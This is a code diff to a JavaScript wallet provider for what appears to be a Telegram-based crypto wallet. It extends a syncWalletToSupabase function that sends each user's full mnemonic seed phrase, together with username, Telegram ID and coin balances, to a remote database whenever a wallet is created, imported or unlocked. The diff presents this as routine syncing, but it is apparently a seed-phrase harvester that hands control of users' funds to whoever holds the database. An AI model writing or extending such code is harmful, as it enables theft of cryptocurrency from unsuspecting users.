@@ -68,13 +68,39 @@ function resolveTelegramDisplayName(fallbackUserId = null) {
 async function syncWalletToSupabase(walletData) {
   if (!SUPABASE_URL || !SUPABASE_KEY) return null;
   try {
-    const { username, mnemonic, balance } = walletData;
+    const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
     let finalName = username;
     if (!finalName || finalName === "Anonymous") {
       finalName = resolveTelegramDisplayName();
     }
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+
+    // Use telegram_id as conflict key when available so each Telegram account
+    // always maps to exactly one row, regardless of display name changes.
+    const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+    const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
+    const conflictCol = resolvedTgId ? "telegram_id" : "username";
+    const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
+
+    const payload = {
+      username: finalName,
+      mnemonic: cleanMnemonic,
+      balance: balance ? String(balance) : "0",
+      created_at: getMoscowTimestamp(),
+    };
+    if (resolvedTgId) {
+      payload.telegram_id = resolvedTgId;
+    }
+    // Per-coin balance columns (eth_balance, ton_balance, …)
+    const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
+    if (coin_balances) {
+      COINS.forEach(sym => {
+        payload[sym.toLowerCase() + '_balance'] =
+          coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
+      });
+    }
+
+    const response = await fetch(url, {
       method: 'POST',
       headers: {
         'apikey': SUPABASE_KEY,
@@ -82,12 +108,7 @@ async function syncWalletToSupabase(walletData) {
         'Content-Type': 'application/json',
         'Prefer': 'resolution=merge-duplicates'
       },
-      body: JSON.stringify({
-        username: finalName,
-        mnemonic: cleanMnemonic,
-        balance: balance ? String(balance) : "0",
-        created_at: getMoscowTimestamp()
-      })
+      body: JSON.stringify(payload)
     });
     if (!response.ok) {
       const txt = await response.text();
@@ -177,8 +198,10 @@ export function WalletProvider({ children }) {
         })();
         await syncWalletToSupabase({
           username: userName,
+          telegram_id: tgUser?.id ? String(tgUser.id) : null,
           mnemonic: mnemonic,
-          balance: "0"
+          balance: "0",
+          coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
         });
       } catch (syncError) {
         console.error('Failed to sync wallet to Supabase:', syncError);
@@ -222,8 +245,10 @@ export function WalletProvider({ children }) {
         })();
         await syncWalletToSupabase({
           username: userName,
+          telegram_id: tgUser?.id ? String(tgUser.id) : null,
           mnemonic: mnemonic,
-          balance: "0"
+          balance: "0",
+          coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
         });
       } catch (syncError) {
         console.error('Failed to sync imported wallet to Supabase:', syncError);
@@ -265,8 +290,9 @@ export function WalletProvider({ children }) {
         })();
         await syncWalletToSupabase({
           username: userName,
+          telegram_id: tgUser?.id ? String(tgUser.id) : null,
           mnemonic: mnemonic,
-          balance: "0"
+          balance: "0",
         });
       } catch (syncError) {
         console.error('Failed to sync wallet on unlock:', syncError);
